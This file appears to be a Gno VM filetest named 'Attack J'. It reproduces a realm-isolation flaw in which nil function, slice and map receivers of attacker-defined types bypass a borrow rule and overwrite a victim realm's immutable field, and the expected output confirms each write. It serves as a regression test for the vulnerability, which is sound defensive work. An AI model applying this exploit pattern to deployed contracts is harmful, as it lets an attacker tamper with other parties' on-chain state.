// PKGPATH: gno.land/r/launderj
package launderj

// Attack J: NIL-VALUED RECEIVERS OF OTHER REFERENCE-UNDERLYING TYPES.
//
// Variants of Attack H/I where the receiver is a nil function-typed
// value, nil slice, or nil map of a defined type. Each has
// `GetFirstObject` returning nil — same borrow rule #2 anchor gap. Each
// successive call overwrites imm.Field; the test asserts the final
// value to confirm all three shapes write through.
//
// Same preconditions as Attack H: exploitable only when victim
// logic data is /p/-declared.

import (
	"gno.land/p/demo/tests/launderattack"
	"gno.land/r/tests/vm/laundervictim"
)

func main(cur realm) {
	gp := laundervictim.GetPtr()
	imm := laundervictim.GetImm()

	var nilFn launderattack.EvilFunc
	gp.UseMutator(imm, nilFn)
	println("after EvilFunc:", laundervictim.ReadImm())

	var nilSlice launderattack.EvilSlice
	gp.UseMutator(imm, nilSlice)
	println("after EvilSlice:", laundervictim.ReadImm())

	var nilMap launderattack.EvilMap
	gp.UseMutator(imm, nilMap)
	println("after EvilMap:", laundervictim.ReadImm())
}

// Output:
// after EvilFunc: pwnd-via-func
// after EvilSlice: pwnd-via-slice
// after EvilMap: pwnd-via-map
